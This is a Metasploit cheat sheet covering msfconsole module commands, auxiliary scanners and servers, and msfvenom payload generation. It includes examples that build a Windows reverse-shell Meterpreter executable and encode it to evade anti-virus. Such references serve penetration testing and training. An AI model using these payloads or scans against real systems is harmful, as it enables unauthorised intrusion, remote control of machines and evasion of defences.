# Metasploit Cheat Sheet

***
Metasploit Project is a computer security project which provide information about vulnerabilities. Help in the development of penetration tests and IDS signatures, metasploit is very popular tool used by pentest experts.

### Metasploit :

- ###### Search for module:

```bash
msf > search [regex]
```

- ###### Specify and exploit to use:

```bash
msf > use exploit/[ExploitPath]
```

- ###### Specify a Payload to use:

```bash
msf > set PAYLOAD [PayloadPath]
```

- ###### Show options for the current modules:

```bash
msf > show options
```

- ###### Set options:

```bash
msf > set [Option] [Value]
```

- ###### Start exploit:

```bash
msf > exploit 
```
***

### Useful Auxiliary Modules


- ###### Port Scanner:

```bash
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 192.168.10.0/24
msf > run
```

- ###### DNS Enumeration:

```bash
msf > use auxiliary/gather/dns_enum
msf > set DOMAIN target.tgt
msf > run
```

- ###### FTP Server:

```bash
msf > use auxiliary/server/ftp
msf > set FTPROOT /tmp/ftproot
msf > run
```

- ###### Proxy Server:

```bash
msf > use auxiliary/server/socks4
msf > run 
```
***

# msfvenom :

msfvenom this is tool can be used to generate Metasploit payloads as standalone files and optionally encode them. This tool replaces `msfpayload` and `msfencode` tools. Run with ‘'-l payloads’ to get a list of payloads.

```bash
$ msfvenom –p [PayloadPath]
–f [FormatType]
LHOST=[LocalHost (if reverse conn.)]
LPORT=[LocalPort]
```


- ##### Example: Reverse Meterpreter payload as an executable and redirected into a file:

```bash
$ msfvenom -p windows/meterpreter/
reverse_tcp -f exe LHOST=192.168.1.1
LPORT=4444 > met.exe
```

Format Options **(specified with –f)** --help-formats – List available output formats

- `-exe` – Executable
- `-pl` – Perl
- `-rb` – Ruby
- `-raw` – Raw shellcode
- `-c` – C code

Encoding Payloads with msfvenom

msfvenom can be used to apply a level of encoding for anti-virus bypass. For example run msfvenom with `-l encoders` to get a list of encoders.

```bash
$ msfvenom -p [Payload] -e [Encoder] -f
[FormatType] -i [EncodeInterations]
LHOST=[LocalHost (if reverse conn.)]
LPORT=[LocalPort]
```

- ##### Example: Encode a payload from msfpayload 5 times using shikata-ga-nai encoder and output as executable:

```bash
$ msfvenom -p windows/meterpreter/
reverse_tcp -i 5 -e x86/shikata_ga_nai -f
exe LHOST=192.168.1.1 LPORT=4444 > mal.exe
```
***

